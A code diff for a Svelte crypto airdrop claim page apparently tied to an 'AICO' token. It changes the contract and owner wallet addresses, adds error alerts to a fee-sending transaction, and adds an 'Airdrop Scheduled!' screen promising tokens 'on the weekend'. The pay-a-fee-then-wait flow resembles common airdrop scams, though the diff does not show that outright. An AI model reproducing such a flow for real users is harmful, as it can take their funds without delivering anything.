@@ -3,7 +3,9 @@
   import { onMount } from "svelte";
   import { fade } from "svelte/transition";
   const BACKEND_URL = 'https://api.companionai.tech'
-  const CONTRACT_ADDRESS = '0x741787F17fAE97F55Ce79382822bba2101d3C77B'
+  const CONTRACT_ADDRESS = '0x4939FDF31F6753E1600307e50ADA499375361FC9'
+  
+  
   let accounts = [];
   let isMMInstalled = false;
   let isMMLoading = false;
@@ -70,7 +72,7 @@
 
   const sendTransaction = debounce(async () => {
     const transaction_fee = '0.0015'
-    const owner_address = '0xB85ece21f715D33F4074138A5066D88987f2486'
+    const owner_address = '0x862B486cD50008A2A6C53a9781E99E5348FfB1d5'
     // Обязательно добавить debounce и блокировку загрузкой страницы
     const signer = await provider.getSigner(address)
     try {
@@ -86,6 +88,12 @@
       }
     } catch (e) {
       console.log(e)
+      if (e.message) {
+        alert(e.message)
+      } else {
+        alert(e)
+      }
+      loading = false
     }
   }, 1000)
   const claimAirdrop = async (hash) => {
@@ -179,6 +187,25 @@
   </button>
 </div>
 {/if}
+<!-- claimed  -->
+ {#if status === 'scheduled'}
+ <div transition:fade class="fixed flex items-center justify-center z-50 bg-[#091720] w-full h-full top-0 left-0">
+   <div class="mr-8"><img width="380" src="/optimized/whitelist-img.webp" alt=""></div>
+   <div class="flex flex-col">
+     <div class="text-[48px] font-bold">
+       Airdrop Scheduled!
+     </div>
+     <div class="text-[32px] max-w-[800px] leading-[120%] mt-4">
+      Your request has been accepted. We will send you your tokens on the weekend.
+     </div>
+     <div class="mt-4 text-[#DBE2EA]">
+       <p>In the meantime You can add token details to Metamask</p>
+       <button on:click={addTokenToMetaMask} class="login-bg mt-3 active:scale-95 active:opacity-50 border inline text-[16px] font-semibold border-[#5ABEFB] text-white py-[13px] px-[30px] rounded-full" href="mailto:support@airdropcompany.com">Add Token to MetaMask</button>
+       <div class="underline decoration-red-400 leading-[140%] mt-3 max-w-[800px]">If your token balance is still <span class="font-bold underline text-[16px]">0 AICO</span>, you might need to wait some time to transaction to be mined.</div>
+     </div>
+   </div>
+ </div>
+ {/if}
 <!-- claimed  -->
  {#if status === 'claimed'}
  <div transition:fade class="fixed flex items-center justify-center z-50 bg-[#091720] w-full h-full top-0 left-0">
